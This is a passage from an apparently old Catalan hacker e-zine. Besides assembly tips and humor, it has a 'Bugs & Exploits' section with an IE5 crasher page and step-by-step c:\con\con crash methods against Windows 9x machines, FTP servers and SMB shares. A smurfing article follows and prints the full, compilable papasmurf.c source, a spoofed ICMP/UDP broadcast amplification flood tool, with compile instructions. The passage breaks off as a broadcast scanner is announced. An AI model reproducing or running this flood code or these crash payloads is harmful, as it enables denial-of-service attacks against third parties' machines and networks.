Aquesta ordre ens pot servir per exemple per agafar un caracter d'una taula
i grabar-lo en al, aixi:

	lea bx, table   ; indiquem on comença la taula
	mov al, 3       ; agafem el 3r caracter de la taula
	xlat
	
	table   db      'ABCDEF'
	
Despres d'aixo, ens trobarem que el registre al val 'C' (usease 43h).


REP:
++++
Repeteix CX vegades la ordre següent, normalment s'empra seguida de MOVSB
(que mou bytes desde DS:SI a ES:DI, i va incrementant SI i DI, segons li
indiqui el DirectionFlag:
    DF = 0 -> Ordre ascendent
    DF = 1 -> Ordre descendent
(El DF es pot activar amb STD i desactivar amb CLD) (set/clear)



Un bon entorn:
++++++++++++++
Per treballar en ASM, sempre va bé tindre algun programeta amb finestres,
menus i demés per poder treballar més ràpidament i amb més seguretat, actual-
ment jo treballo amb el Alab (Asembler Laboratori), que es bastant bó (i es
comparable al TurboC o TurboPascal pero per asm)- Segurament podreu trobar
l'ultima versió a la nostra plana, o sino digueu-me algo a poptph@hotmail.com
i faré el que pugui.

L'Alab el podeu trobar a: http://www.colargol.tihlde.hist.no/~kurtg/



			pop.tph == pancake

						   My moon look at me.-Desirée


==============================================================================
··············································································
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
··············································································
==============================================================================


$03$


@---------------------@@@@@
@@                     @@@@
@@@   Bugs & Exploits   @@@
@@@@                     @@
@@@@@---------------------@


Estrenem aquesta nova secció, pq creiem necessaria, a més de que serà una
secció [activa], ja que podreu col·laborar tots, i en la que us informarem
dels fallos(bugs), forma d'aprofitar-nos(exploits), i forma de prevenir-los
dins de la seguretat informàtica.

Si, potser el títol de la secció és massa típic, pero...que coi podiem possar?
xDD

----[1]-----------------------------------------------------------------------

- Victimes: Alguns programes de Windows 9X
- Solució: Canviar la data.
- Informa: Pop.tPH
- Explicació:
   Moltes aplicacions pel "SO" windows estàn mal escrites (com el mIRC o el
   GetRight), i quan recullen la data del sistema els fa provocar una fallada
   general en el programa i l'acaven tancant. Aquest error es dóna al intentar
   possar la data mes alta permesa pel sistema (2099).

----[1]-----------------------------------------------------------------------

----[2]-----------------------------------------------------------------------

- Informa: d0Nner

Bug (o no): 

Obtindre un llistat d'arxius i directioris : http://objectiu/?wp-cs-dump. El 
paràmetre ?wp-cs-dump pot esser: 
?wp-ver-info 
?wp-html-rend 
?wp-usr-prop 
?wp-ver-diff 
?wp-verify-link 
?wp-start-ver 
?wp-stop-ver 
?wp-uncheckout 
  

Solucció: 

Service method="(GET|HEAD)" type="magnus-internal/directory" 
fn="index-common" 

----[2]-----------------------------------------------------------------------

----[3]-----------------------------------------------------------------------
Informa: BaRner
Victima: IE5
Funcions: Aquest codi html penja qualsevol màquina funcionant amb IE5.

<html>
<head>
  <title>NeonBunny's IE5 Crasher</title>
</head>
<body>
  <form method="POST">
    <table>
      <tr>
	<td width="20%"><input type="text" name="State" size="99999999"
maxlength="99999999" value=""></td>
      </tr>
    </table>
  </form>
</body>
</html>

----[3]-----------------------------------------------------------------------

----[4]-----------------------------------------------------------------------
Informa: Pop.tPH
Victima: w95 w98 ... (no he pogut probar en d'altres)
Funció: És una mena d'ou de pasqua.
  La qüestió està en fer un fitxer nou amb el nom de "sk.bat" i executar-lo,
  aquest al ser finalitzat ens donarà al titol de la finestra el nom:
   sk.bat Soft Kicker.
  Algú sap d k serveix??
----[4]-----------------------------------------------------------------------


----[5]-----------------------------------------------------------------------

                             EL RACO DE L'EXPLOIT

                           per Alex Castan Salinas
                              alex.castan@upc.es

                            *--------------------*
                            |                    |
                            |  El teu ordinador  |
                            |      es mort...    |
                            | i abans estava viu |
                            |     _______        |
                            |    |.-----.|       |
                            |    ||x . x||       |
                            |    ||_.-._||       |
                            |    `--)-(--'       |
                            |   __[=== o]___     |
                            |  |:::::::::::|\    |
                            |  `-=========-'()   |
                            |                    |
                            | No hauries d'haver |
                            |    instal.lat :    |
                            |                    |
                            |  -= Windows'95 =-  |
                            *--------------------*
 


Vulnerabilitat : Windows es penja accedint a c:\con\con

Afecta a : Windows 95 i 98. No afecta a Windows 2000 i Windows NT 4


Be, a les seguents linies explico una vulnerabilitat que fa que el Windows es
pengi. Encara que es una vulnerabilitat forca vella, avui en dia la majoria de
maquines amb Windows 9x continuen desprotegides.



INTRODUCCIO
-----------
D'enca els primers dies del MS-DOS, alguns controladors de dispositius del
sistema es representaven amb uns noms especials. Aquests son:

           CON                 Consola (teclat + pantalla)
           COM1, COM2, ...     Ports serie de comunicacio
           LPT1, LPT2, ...     Ports paral.lel de comunicacio
           AUX                 Primer port serie de comunicacio
           PRN                 Primer port paral.lel de comunicacio
           NUL                 Port fictici - dispositiu nul
           CLOCK$              Rellotge del sistema
           CONFIG$             Desconegut

De tal manera que podiem utilitzar aquests noms com si es tractessin de
fitxers, quan realment es tractava de dispositius. Veiem alguns exemples:

  DIR > PRN            Llista el directori actual per impressora
  COPY CON HOLA.TXT    Copia el que escrivim pel teclat al fitxer hola.txt
  DOSKEY > NUL         Executa la comanda doskey sense treure cap missatge

Aquests noms de dispositius de l'antic MS-DOS encara existeixen i es poden
emprar al sistema operatiu Windows.



VULNERABILITAT
--------------
Usuaris locals i remots poden penjar maquines amb Windows 95 i 98 emprant noms
de camins especials que fan referencia a certs controladors de dispositius.
Les maquines amb aquests sistemes operatius es pengen quan processen noms
formats de la seguent manera:

                      [disc]:\[dispositiu]\[dispositiu]

on [disc] es la lletra d'una unitat i [dispositiu] es un dels seguents: CON,
AUX, NUL, CLOCK$ i CONFIG$. En canvi, els dispositius LPT[x]: , COM[x]: i PRN
(on [x] es un nombre enter) no pengen el sistema. Tampoc pengen el sistema els
camins del tipus [disc]:\[dispositiu]\[fitxer] , sino que unicament causen un
missatge d'error.

Un cop penjada la maquina cal reiniciar-la de nou per que torni a funcionar.
Que us pensaveu, doncs :-)

Breu i planerament explicat: Windows 9x es penja quan intentem accedir als
fitxers c:\con\con , c:\nul\nul , c:\aux\nul , etc.



COM EXPLOTAR LA VULNERABILITAT
------------------------------

1. Intentar obrir directament el fitxer 

                  boto INICI -> opcio EXECUTAR -> c:/con/con

   o be, a una finestra MS-DOS:

                                 dir con\con

2. Intentar obrir dins qualsevol aplicacio el fitxer.

   Per exemple, al processador de text Word obriu el document inexistent
   c:\con\con , o al navegador d'Internet introduiu com adreca de la pagina
   file://c:\con\con

3. Modificar el registre.

   Per exemple, introduint el valor c:\con\con "%1" %* a la clau del registre

            HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open

   Imagineu el que els virus de macro poden fer a partir d'ara als vostres
   ordinadors amb Windows.

4. Codi HTML malicios.

   Col.locant el codi a una pagina html que intenti obrir el fitxer. Aquesta
   pagina es pot carregar des del navegador d'Internet, pero tambe molts
   programes de lectura de correu electronic carreguen codi html als seus
   missatges. Aquests codi pot fer referencia al fitxer de diverses maneres.

   Be pot ser un enllac:

      <HTML>
        <BODY>
          <A HREF="c:\con\con">El que vulguis posar</A>
        </BODY>
      </HTML>

   Be pot ser una imatge:

      <HTML>
        <BODY>
          <IMG SRC="c:\con\con">
        </BODY>
      </HTML>

5. Penjar servidors remots que treballen sobre maquines amb Windows 9x.

   Per exemple, es pot penjar el servidor de www FrontPage Webserver
   proporcionant la seguent adreca al vostre navegador:

     http://www.nom_lloc.com/con/con     o     http://www.nom_lloc.es/nul/nul

   Un altre exemple. Es pot penjar els servidors de ftp WarFTPd v1.70 i Gene6
   FTP Server v2.0 executant les comandes:

                      get /con/con     i     ls /con/con

   Un altre exemple. Veieu com penjar el servidor de ftp servU-FTP v2.4a:

      Entreu des de qualsevol maquina amb ftp, com a usuari anonim o convidat

      resposta  |   230 User logged in, proceed.
                |
      comanda   |   SYST
      resposta  |   215 UNIX TYPE:L8
      resposta  |   connect ok!
                |
      comanda   |   PWD
      resposta  |   257 "c:/home" is current directory.
      resposta  |   haal directory op
                |
      comanda   |   TYPE A
      resposta  |   200 Type set to A.
                |
      comanda   |   PORT xx.xx.xx.xx    Ejehm! :-)
      resposta  |   200 PORT Command succesful.
                |
      comanda   |   LIST
      resposta  |   150 Opening ASCII mode data connect.
      resposta  |   Download: 86 bytes
      resposta  |   Wacht op de server
      resposta  |   226 Transfer complete.
                |
      comanda   |   CDUP
      resposta  |   250 Directory changed to /c:/
                |
      comanda   |   PWD
      resposta  |   250 "/c:/" is current directory.
                |
      comanda   |   CWD /con/con

      No hi ha mes resposta. Aquesta ultima comanda penja el servidor.

6. Recursos compartits - SMB.

   Connecteu amb una maquina amb Windows 9x de la vostra xarxa que tingui un
   recurs compartit i assigneu-li el nom d'una unitat a aquest recurs. A
   continuacio executeu la comanda "cd con/con" sobre aquesta unitat i haureu
   penjat la maquina que compartia el recurs. Tot aixo ho podeu fer des d'una
   altre maquina amb qualsevol sistema operatiu que ho permeti, per exemple
   Windows o Linux amb SAMBA, sempre que sapigueu la contrasenya del recurs
   compartit o que el recurs comparit no tingui contrasenya.
   A mes a mes, cal assenyalar que els usuaris de Windows 9x que comparteixen
   impressores poden tenir un recurs compartit sense contrasenya anomenat
   PRINTER$ que deixa la via lliure a aquest atac. Per exemple:

      comanda   |   c:\> net use * \\192.168.0.6\PRINTER$
      resposta  |   Drive G: is now connected to \\192.168.0.6\PRINTER$
      resposta  |   The command completed successfully.
                |
      comanda   |   c:\> g:
      resposta  |   g:\>
                |
      comanda   |   g:\> cd \CLOCK$\CLOCK$

      No hi ha mes resposta. Aquesta ultima comanda penja la maquina.

7. I tots d'altres metodes que s'us acudeixin. Deixeu volar la imaginacio.



EL PEGAT
--------
Si teniu Windows 95 o Windows 98 a la vostra maquina, el pegat que soluciona
aquesta vulnerabilitat el trobareu a 

       http://www.microsoft.com/technet/security/bulletin/ms00-017.asp

----[5]-----------------------------------------------------------------------

----[6]-----------------------------------------------------------------------

Objectiu: Tirar el wNT4 amb IIS4
Requeriments: Que tingui NetBios amb recursos compartits
Informa: Pop.tPH

Si accedim a una nt4 amb iis4 amb els recursos compartits i poguem accedir al
seu sistema de fitxers sera tant facil tirar-la com fer:
     cd \
     cd ..
al fer cd .. en el directori arrel la màquina es penjara.

Solució: Actualitzar-se la IIS o canviar-se de SO. :)

----[6]-----------------------------------------------------------------------



OU DE PASCUA AL WORD.
=====================
document nou: escribiu "BLUE " sense cometes, en color Blau i Negreta, llavors
entreu a AYUDA i ACERCA DE WORD i clickeu sobre l'icona de WORD (dins de la
finestra de l'ajuda) , automàticament se us cargarà un joc de pinball k es
controla amb les tecles M i Z.



				     --Be Warned! The Nature Of Your Opression
						Is The Aesthetic Of Our Anger.

==============================================================================
//////////////////////////////////////////////////////////////////////////////
010101010101010101010101010101010101010101010101010101010101010101010101010101
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================

$04$

[Humor]

Com saber si jugues massa al Doom? Jugues massa al Doom quan:

 1.- Intentes canviar de carril a la autopista esquivant en zig-zag.
 2.- Intentes treure la teva BFG9000 si algu et passa davant cami de la
feina.
 3.- Intentes recollir les coses caminant per sobre d'elles.
 4.- Et menges les boles blaves i verds de l'arbre de Nadal.
 5.- Quan et trobes malament mires avall buscant la barra d'estat.
 6.- Tires avall la porta de casa teva, saltes enrera i dispares al carter.
 7.- En tornar de la feina a casa mires pels carrers si hi ha botiquins i
munició.
 8.- Empenys les parets mentre camines pels passadissos buscant entrades
secretes.
 9.- No pots parar d'entretancar els ulls mentre passeges per casa teva.
10.- El teu PC arrenca amb el DOOM a menys que premis una tecla.


  _______________
[[  w95 Topics:  ]]
  """""""""""""""

- Keyboard Error, Press F1 to continue.

- S'ha trobat una rutina correcte, siusplau esborri-la

- Diferencies entre w9x i un virus?
  w95   - s'ha de pagar i ocupa més de 100mb
  virus - és gratuït, i acostuma a ocupar menys de 2 KB.
- Semblances:
  Tots dos acostumen a tindre un payload destructiu (no sempre).
  > Vosaltres podeu escollir. :)

	 __________________________________________
	|__Pança_Antivirus_________________________|
	|                                          |
	| Advertència de Pança Antivirus:          |
	| Virus Win.95 dectectat en C:\WINDOWS     |
	|                                          |
	| Que destija fer?                         |
	|  __________    __________    __________  |
	| | Eliminar |  | Eliminar |  | Eliminar | |
	|__________________________________________|

- El sistema és inestable, siusplau escrigui DELTREE WINDOWS desde MS-DOS.

- S'han trobat 63.000 defectes de programació en la primera versió del w2k.
  I el seu preu de sortida és de 85.000
  > Calculem: 0.74 pesetes el bug.
  > I la pregunta és quin serà el preu de reparació d'aquests errors?
    baixar-nos tots els pegats, posem-lis uns 200kb per pegat.
    Si la conexió a inet és via telefònica és de 2kb/s (normal tirant a alta)
    Tardariem més o menys un minut per baixar-nos cada pegat- suposant q
    tinguem sort, el trobem ràpid i la conexió vagi bé. - Calculem la

    Temps que tardariem en baixar-nos tots els pegats:
                    1 minut         1 hora
  63.000 pegats x -----------  x  ---------- = 1050 hores = 43'75 dies
                   1 pegat        60 minuts

    >tarifa punta: 400pts/hora - 1050 x 400 = 420.000 pts

    >tarifa baixa: 200pts/hora - 1050 x 200 = 210.000 pts
	* valors aproximats *

    Supossant que ens ho baixem tot seguit i q al dia hi ha 50% tarifa
    punta i 50% tarifa reduïda (fals).  Seria:
    
    ( 420.000 x 210.000 ) / 2 = [[  315.000 pts  ]]

	Aixo ens dona un resultat de preu total del producte de

	    400.000 pts on el 75% dels beneficis sel's emporta la (T).



						  Quantes agressions haurem de 
						  patir per començar a actuar?

==============================================================================
//////////////////////////////////////////////////////////////////////////////
010101010101010101010101010101010101010101010101010101010101010101010101010101
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================

$05$


 |^^^^^^^^^^^^^^^^^^^**********************
 |   Smurfing        per BaRner 26/04/00 *
 |                   **********************
 ^^^^^^^^^^^^^^^^^^^^





-->*Què vol dir Smurfing?
    ---------------------

  Smurfing és un tipu d'atac de denegació de serveis , Denial of Services (DoS).



-->*En què consisteix?
    ------------------

  Aquest tipu d'atac utilitza la caràcteristica broadcast de Internet per 
  aconseguir els seus objectius.
  El broadcast és el que tenen totes les xarxes on tots els datagrames 
  que s'envien a aquesta direcció son rebuts per totes les màquines de la
  xarxa local. 
  Aquesta direcció de broadcast és accesible per a qualsevol persona de internet.
  D'aquesta manera si jo envio un paquet a aquesta direcció, aquesta em respondrà
  amb un paquet de major tamany. 
  Però si ens fem passar per una altre ip (ip-spoofing) la resposta serà enviada 
  a aquesta ip. I si ho hem enviat a un broadcast del qual és una xarxa de 100 
  hosts doncs la resposta serà d'efecte multiplicador.
  serà enviada a aquesta ip. D'aquesta manera el que podem fer es spoofejar 
  aquesta ip i posar enlloc de la nostra, la ip de la victima. Llavors  els 
  ICMP echo (ping) que hagim enviat a la direcció de broadcast serà rebut per 
  la ip victima.



-->*Veiem un exemple d'atac smurfing:
   ---------------------------------


  L'atacant envia paquets ICMP echo (ping) a una velocitat de 768kb/s
  amb una direccio falsejada corresponent a la ip de la víctima, (ip-spoofing)
  a la direcció broadcast del "ajudant". Aquests paquets arriben als 100 hosts 
  de la xarxa broadcasts. Cadascún d'aquests hosts respon el ping fet.
  Llavors l'ample de banda es multiplicat per el nombre de hosts.
  És a dir, si teniem ke l'ample de banda era 768kb/s multiplicat per els 100 
  hosts que té la xarxa ens surtirà un ample de banda de 76.8MB/s.


-->*Com detectar l'atac:
   --------------------

  El que si que es pot fer és detectar i no arreglar (ja que es un atac relament
  nou). 
  Hi ha un programa anomenat Smurflog.tgz que permet saber la persona que t'està 
  atacant i des de on t'està atacant
  El podreu trobar a www.rootshell.com  o a www.technotronic.com
   

   
-->* Utilitzant smurflog.tgz
     ------------------------

  Aquest programa el que fa és no acceptar paquets ICMP. D'aquesta manera evitarem
  danys al l'ordinador. També el que es pot fer és configurar el router per evitar 
  rebre paquets ICMP.
  



-->*Com saber si la teva xarxa és vulnerable
   -----------------------------------------

  Hi ha alguns llocs on pots saber si la teva xarxa és vulnerable

  http://www.netscan.org  
  http://www.powertech.no/smurf 


-->* On puc trobar programes que facin smurfing?  
     -------------------------------------------

  Aqui mateix , per exemple:


  Per compilar-lo haureu de fer el seguent: 

  gcc -DLINUX -o smurf5 papasmurf.c  (en el cas que estigueu des de linux)

  NOTA: ÉS necessari ser root per poder executar aquest programa.



  <papasmurf.c>


/*
 *  (papa)smurf.c v5.0 by TFreak - http://www.rootshell.com
 *
 *  A year ago today I made what remains the questionable decision of 
 *  releasing my program 'smurf', a program which uses broadcast "amplifiers"
 *  to turn an icmp flood into an icmp holocaust, into the hands of packet
 *  monkeys, script kiddies and all round clueless idiots alike.  Nine months
 *  following, a second program 'fraggle', smurfs udp cousin, was introducted
 *  into their Denial of Service orgy.  This brings us to today, July 28,
 *  1998, one year after my first "mistake".  The result, proof that history
 *  does repeat itself and a hybrid of the original programs.
 *
 *  First may I say that I in no way take credit for "discovering" this.
 *  There is no doubt in my mind that this idea was invisioned long before
 *  I was even sperm -- I merely decided to do something about it.  Secondly,
 *  if you want to hold me personally responsible for turning the internet
 *  into a larger sesspool of crap than it already is, then may I take this 
 *  opportunity to deliver to you a message of the utmost importance -- "Fuck
 *  you".  If I didn't write it, someone else would have.
 *
 *  I must admit that there really is no security value for me releasing this
 *  new version.  In fact, my goals for the version are quite silly. First,
 *  I didn't like the way my old code looked, it was ugly to look at and it
 *  did some stupid unoptimized things.  Second, it's smurfs one year 
 *  birthday -- Since I highly doubt anyone would have bought it a cake, I
 *  thought I would do something "special" to commemorate the day.
 *
 *  Hmm, I am starting to see why I am known for my headers (wage eats
 *  playdough!).
 *
 *  Well, I guess this wouldn't be the same if I did not include some sort
 *  of shoutouts, so here goes...
 *
 *  A hearty handshake to...
 *
 *    o  MSofty, pbug, Kain -- No matter which path each of you decides to 
 *       take in the future, I will always look back upon these days as one 
 *       of the most enjoyable, memorable and thought-provoking experiences 
 *       of my life.  I have nothing but the highest degree of respect for 
 *       each of you, and I value your friendship immensely.  Here's to 
 *       living, learning and laughing -- Cheers gentlemen. --Dan
 *    o  Hi JoJo!
 *    o  morbid and his grandam barbiegirl gino styles, yo.
 *    o  The old #havok crew.
 *    o  Pharos,silph,chris@unix.org,Viola,Vonne,Dianora,fyber,silitek,
 *       brightmn,Craig Huegen,Dakal,Col_Rebel,Rick the Temp,jenni`,Paige,
 *       RedFemme,nici,everlast,and everyone else I know and love.
 *
 *  A hearty enema using 15.0mol/L HCl to...
 *    
 *    o  #Conflict.  Perhaps you are just my scapegoat of agression, but you
 *       all really need to stop flooding efnet servers/taking over irc 
 *       channels/mass owning networks running old qpoppers and get a
 *       fucking life.
 *    o  BR.  It wouldn't be the same without you in here, but to be honest
 *       you really aren't worth the space in the already way-to-bloated
 *       header, nor the creative energy of me coming up with an intricate
 *       bash that you will never understand anyway.  Shrug, hatred disguises
 *       itself as apathy with time.
 *
 *  I feel like I'm writing a fucking essay here...
 *
 *  To compile: "gcc -DLINUX -o smurf5 papasmurf.c" if your LINUXish.
 *                                 or just
 *              "gcc -o smurf5 papasmurf.c" if your BSDish.
 *  
 *  Old linux kernels won't have BSD header support, so this may not compile.
 *  If you wish a linux-only version, do it yourself, or mail 
 *  tfreak@jaded.net, and I might lend you mine.
 *
 *  And most importantly, please don't abuse this.  If you are going to do
 *  anything with this code, learn from it.
 *
 *  I remain,
 *
 *  TFreak.
 *
 */

/* End of Hideously Long Header */
			    
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#ifdef LINUX 
#define __FAVOR_BSD                             /* should be __FAVOUR_BSD ;) */
#ifndef _USE_BSD
#define _USE_BSD
#endif
#endif
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>

#ifdef LINUX
#define FIX(n)  htons(n)
#else
#define FIX(n)  (n)
#endif

struct smurf_t
{
    struct sockaddr_in sin;                     /* socket prot structure */
    int s;                                      /* socket */
    int udp, icmp;                              /* icmp, udp booleans */
    int rnd;                                    /* Random dst port boolean */
    int psize;                                  /* packet size */
    int num;                                    /* number of packets to send */
    int delay;                                  /* delay between (in ms) */
    u_short dstport[25+1];                      /* dest port array (udp) */
    u_short srcport;                            /* source port (udp) */
    char *padding;                              /* junk data */
};

/* function prototypes */
void usage (char *);
u_long resolve (char *);
void getports (struct smurf_t *, char *);
void smurficmp (struct smurf_t *, u_long);
void smurfudp (struct smurf_t *, u_long, int);
u_short in_chksum (u_short *, int);


int 
main (int argc, char *argv[])
{
    struct smurf_t sm;
    struct stat st;
    u_long bcast[1024];
    char buf[32];
    int c, fd, n, cycle, num = 0, on = 1; 
    FILE *bcastfile;

    /* shameless self promotion banner */
    fprintf(stderr, "\n(papa)smurf.c v5.0 by TFreak\n\n");

    if (argc < 3) 
	usage(argv[0]);

    /* set defaults */
    memset((struct smurf_t *) &sm, 0, sizeof(sm));
    sm.icmp = 1;
    sm.psize = 64;
    sm.num = 0;
    sm.delay = 10000;
    sm.sin.sin_port = htons(0);
    sm.sin.sin_family = AF_INET;
    sm.srcport = 0;
    sm.dstport[0] = 7;

    /* resolve 'source' host, quit on error */
    sm.sin.sin_addr.s_addr = resolve(argv[1]);

    /* open the broadcast file */
    if ((bcastfile = fopen(argv[2], "r")) == NULL)
    {
	perror("Opening broadcast file");
	exit(-1);
    }

    /* parse out options */
    optind = 3;
    while ((c = getopt(argc, argv, "rRn:d:p:P:s:S:f:")) != -1)
    {
	switch (c)
	{
	    /* random dest ports */
	    case 'r':
		sm.rnd = 1;
		break;

	    /* random src/dest ports */
	    case 'R':
		sm.rnd = 1;
		sm.srcport = 0;
		break;

	    /* number of packets to send */
	    case 'n':
		sm.num = atoi(optarg);
		break;

	    /* usleep between packets (in ms) */
	    case 'd':
		sm.delay = atoi(optarg);
		break;

	    /* multiple ports */
	    case 'p':
		if (strchr(optarg, ',')) 
		    getports(&sm, optarg);
		else
		    sm.dstport[0] = (u_short) atoi(optarg);
		break;

	    /* specify protocol */
	    case 'P':
		if (strcmp(optarg, "icmp") == 0)
		{
		    /* this is redundant */
		    sm.icmp = 1;
		    break;
		}
		if (strcmp(optarg, "udp") == 0)
		{
		    sm.icmp = 0;
		    sm.udp = 1;
		    break;
		}
		if (strcmp(optarg, "both") == 0)
		{
		    sm.icmp = 1;
		    sm.udp = 1;
		    break;
		}

		puts("Error: Protocol must be icmp, udp or both");
		exit(-1);

	    /* source port */
	    case 's':
		sm.srcport = (u_short) atoi(optarg);
		break;

	    /* specify packet size */
	    case 'S':
		sm.psize = atoi(optarg);
		break;

	    /* filename to read padding in from */
	    case 'f':
		/* open and stat */
		if ((fd = open(optarg, O_RDONLY)) == -1)
		{
		    perror("Opening packet data file");
		    exit(-1);
		}
		if (fstat(fd, &st) == -1)
		{
		    perror("fstat()");
		    exit(-1);
		}

		/* malloc and read */
		sm.padding = (char *) malloc(st.st_size);
		if (read(fd, sm.padding, st.st_size) < st.st_size)
		{
		    perror("read()");
		    exit(-1);
		}

		sm.psize = st.st_size;
		close(fd);
		break;

	    default:
		usage(argv[0]);
	}
    } /* end getopt() loop */
	    
    /* create packet padding if neccessary */
    if (!sm.padding)
    {
	sm.padding = (char *) malloc(sm.psize);
	memset(sm.padding, 0, sm.psize);
    }

    /* create the raw socket */
    if ((sm.s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
	perror("Creating raw socket (are you root?)");
	exit(-1);
    }

    /* Include IP headers ourself (thanks anyway though) */
    if (setsockopt(sm.s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
    {
	perror("setsockopt()");
	exit(-1);
    }

    /* read in our broadcasts and store them in our array */
    while (fgets(buf, sizeof buf, bcastfile) != NULL)
    {
	char *p;
	int valid;

	/* skip over comments/blank lines */
	if (buf[0] == '#' || buf[0] == '\n') continue;

	/* get rid of newline */ 
	buf[strlen(buf) - 1] = '\0';

	/* check for valid address */
	for (p = buf, valid = 1; *p != '\0'; p++)
	{
	    if ( ! isdigit(*p) && *p != '.' ) 
	    {
		fprintf(stderr, "Skipping invalid ip %s\n", buf);
		valid = 0;
		break;
	    }
	}

	/* if valid address, copy to our array */
	if (valid)
	{
	    bcast[num] = inet_addr(buf);
	    num++;
	    if (num == 1024)
		break;
	}
    } /* end bcast while loop */

    /* seed our random function */
    srand(time(NULL) * getpid());

    /* wee.. */
    for (n = 0, cycle = 0; n < sm.num || !sm.num; n++)
    {
	if (sm.icmp)
	    smurficmp(&sm, bcast[cycle]);

	if (sm.udp)
	{
	    int x;
	    for (x = 0; sm.dstport[x] != 0; x++)
		smurfudp(&sm, bcast[cycle], x);
	}

	/* quick nap */
	usleep(sm.delay);

	/* cosmetic psychadelic dots */
	if (n % 50 == 0)
	{
	    printf(".");
	    fflush(stdout);
	}

	cycle = (cycle + 1) % num;
    }

    exit(0);
}


void 
usage (char *s)
{
    fprintf(stderr,
	    "usage: %s <source host> <broadcast file> [options]\n"
	    "\n"
	    "Options\n"
	    "-p:	Comma separated list of dest ports (default 7)\n"
	    "-r:	Use random dest ports\n"
	    "-R:	Use random src/dest ports\n"
	    "-s:	Source port (0 for random (default))\n"
	    "-P:	Protocols to use.  Either icmp, udp or both\n"
	    "-S:	Packet size in bytes (default 64)\n"
	    "-f:	Filename containg packet data (not needed)\n"
	    "-n:	Num of packets to send (0 is continuous (default))\n"
	    "-d:	Delay inbetween packets (in ms) (default 10000)\n"
	    "\n", s);
    exit(-1);
}


u_long 
resolve (char *host)
{
    struct in_addr in;
    struct hostent *he;

    /* try ip first */
    if ((in.s_addr = inet_addr(host)) == -1)
    {
	/* nope, try it as a fqdn */
	if ((he = gethostbyname(host)) == NULL)
	{
	    /* can't resolve, bye. */
	    herror("Resolving victim host");
	    exit(-1);
	}

	memcpy( (caddr_t) &in, he->h_addr, he->h_length);
    }

    return(in.s_addr);
}
	

void 
getports (struct smurf_t *sm, char *p)
{
    char tmpbuf[16];
    int n, i;

    for (n = 0, i = 0; (n < 25) && (*p != '\0'); p++, i++)
    {
	if (*p == ',')
	{
	    tmpbuf[i] = '\0';
	    sm->dstport[n] = (u_short) atoi(tmpbuf);
	    n++; i = -1;
	    continue;
	}

	tmpbuf[i] = *p;
    }
    tmpbuf[i] = '\0';
    sm->dstport[n] = (u_short) atoi(tmpbuf);
    sm->dstport[n + 1] = 0;
}


void
smurficmp (struct smurf_t *sm, u_long dst)
{
    struct ip *ip;
    struct icmp *icmp;
    char *packet;

    int pktsize = sizeof(struct ip) + sizeof(struct icmp) + sm->psize;

    packet = malloc(pktsize);
    ip = (struct ip *) packet;
    icmp = (struct icmp *) (packet + sizeof(struct ip));

    memset(packet, 0, pktsize);

    /* fill in IP header */
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = FIX(pktsize);
    ip->ip_ttl = 255;
    ip->ip_off = 0;
    ip->ip_id = FIX( getpid() );
    ip->ip_p = IPPROTO_ICMP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;
    ip->ip_dst.s_addr = dst;

    /* fill in ICMP header */
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));        /* thx griffin */

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
	sizeof(struct sockaddr)) == -1)
    {
	perror("sendto()");
	exit(-1);
    }

    free(packet);                                       /* free willy! */
}


void
smurfudp (struct smurf_t *sm, u_long dst, int n)
{
    struct ip *ip;
    struct udphdr *udp;
    char *packet, *data;

    int pktsize = sizeof(struct ip) + sizeof(struct udphdr) + sm->psize;

    packet = (char *) malloc(pktsize);
    ip = (struct ip *) packet;
    udp = (struct udphdr *) (packet + sizeof(struct ip));
    data = (char *) (packet + sizeof(struct ip) + sizeof(struct udphdr));

    memset(packet, 0, pktsize);
    if (*sm->padding)
	memcpy((char *)data, sm->padding, sm->psize);

    /* fill in IP header */
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = FIX(pktsize);
    ip->ip_ttl = 255;
    ip->ip_off = 0;
    ip->ip_id = FIX( getpid() );
    ip->ip_p = IPPROTO_UDP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;
    ip->ip_dst.s_addr = dst;

    /* fill in UDP header */
    if (sm->srcport) udp->uh_sport = htons(sm->srcport);
    else udp->uh_sport = htons(rand());
    if (sm->rnd) udp->uh_dport = htons(rand());
    else udp->uh_dport = htons(sm->dstport[n]);
    udp->uh_ulen = htons(sizeof(struct udphdr) + sm->psize);
//    udp->uh_sum = in_chksum((u_short *)udp, sizeof(udp));

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
	sizeof(struct sockaddr)) == -1)
    {
	perror("sendto()");
	exit(-1);
    }

    free(packet);                               /* free willy! */
}


u_short
in_chksum (u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) 
    {
	sum += *w++;
	nleft -= 2;
    }

    if (nleft == 1) 
    {
	*(u_char *)(&answer) = *(u_char *)w;
	sum += answer;
    }

    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

/* EOF */


============================================================================
============================================================================


  També us poso un escanejador de broadcasts:

<broadscan.c>

